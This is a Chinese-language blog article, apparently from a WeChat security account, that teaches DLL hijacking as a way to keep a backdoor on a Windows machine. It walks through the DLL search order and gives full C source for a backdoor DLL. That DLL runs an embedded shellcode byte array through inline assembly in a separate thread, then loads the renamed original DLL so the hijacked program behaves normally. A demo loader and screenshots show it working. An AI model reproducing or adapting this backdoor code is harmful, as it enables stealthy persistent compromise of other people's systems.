> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/P0Vsa5ydTMHWl5NNbxIWUw)

```
由于导入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。
首先会尝试从当前程序所在的目录加载DLL，
如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。
利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。
```

    接下来看我这个灵魂画手，可以看到 Dll 被劫持后的区别  

    可能有的人会问，我既然 dll 都已经劫持了，为什么还要载入原菜刀的 dll。  

这是因为我们的 dll 只是把原菜刀的 dll 进行了替换，而原菜刀. dll 的功能代码我们还没有载入，否则菜刀. exe 肯定是不能正常运行。

既然要做到权限维持，肯定就要把 shellcode 代码和原菜刀. dll 都要加载。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyysEANDwZ1ReVAwHSCickOf2oGtibF8ywfbo30PYsfe9GnnJwbIsfxgqI3X2MEAJIibl5Al7Om6NSLNQ/640?wx_fmt=png)

        在应用程序刚开始寻找 dll 的时候，也会有一个顺序。

假设，程序原 dll 在第五步 (当前目录)，而我们在第二步(系统目录) 放置后门

，应用程序到第二步 (系统目录) 找到之后，就不会在寻找。然后我们将第二步 (系统目录) 里面的后门在加载第五步里面真正的 dll。这样的话就做到了后门和程序正常执行。  

```
1. 程序所在目录；
2. 系统目录；
3. 16位系统目录；
4. Windows目录；
5. 当前目录；
6. PATH环境变量中的各个目录。
```

具体实现：

    1. 准备一个 dll 后门，这里为了方便用 MessageBox 弹窗演示，当我们 dll 被加载的时候，我创建了两个线程，Threads 线程用来执行 shellcode，Threads1 加载原 dll。  

```
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
typedef void(*CODE)();  

unsigned char  shellcode[]=
  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
     "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
     "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
     "\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
     "\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
     "\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
     "\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
     "\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
     "\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
     "\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
     "\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";


DWORD WINAPI Threads(LPVOID lpParameter){

  _asm{
   lea eax,shellcode
   push eax
   ret
  }


  return 0;
}

DWORD WINAPI Threads1(LPVOID lpParameter){
  LoadLibrary("A.dll");
  return 0;
}
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
           )
{
  switch(ul_reason_for_call){
  case DLL_PROCESS_ATTACH:
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Threads,0,0,NULL);
    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Threads1,0,0,NULL);
    break;  
  }
  
    return TRUE;
}
```

    我为了给大家演示方便，思路清晰，就没有写导入表相关的东西。  

exe 程序代码如下，只载入了一个 met.dll

```
#include "stdafx.h"
#include <Windows.h>
int main(int argc, char* argv[])
{
  HMODULE h = LoadLibrary("met.dll");
  if(!h){
    printf("Dll Error\n");
  }
  getchar();
  return 0;
}
```

    我们看一下程序的正常执行流程，一直会打印 “正常 Dll 执行中”  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyysEANDwZ1ReVAwHSCickOf2QuwkUcuCzPwqK0ibEKAFM3L3Y1jScRVRXYSFQ54yxJlml8ww5Afxovw/640?wx_fmt=png)

    当把后门. dll 更名为 met.dll 后，然后将原 dll 换个名字  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyysEANDwZ1ReVAwHSCickOf2ibJf5cuaIgJ5ia6HdeHQ8ibUraJbrU2OZn6IeUHrYfG1ibRjTcyBCTuycw/640?wx_fmt=png)

    成功执行我们的 shellcode，之后 loadlibrary 加载原 dll，正常执行程序代码

提示：A.dll 这个原文件我为了演示清楚，放在了当前目录了。

像 dll 劫持的话，还有好多方法，大家可以花点时间弄的更完善一些~  

微信搜索关注：安全族    (回复 1234 获取安全课程)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWyxYamBzambXjkc4piahKzqMl3DBsVbtpPWZUDaR1MaaTvZ2bopvic0OcQmOpyWbHSM3r71lgxQ782kA/640?wx_fmt=jpeg)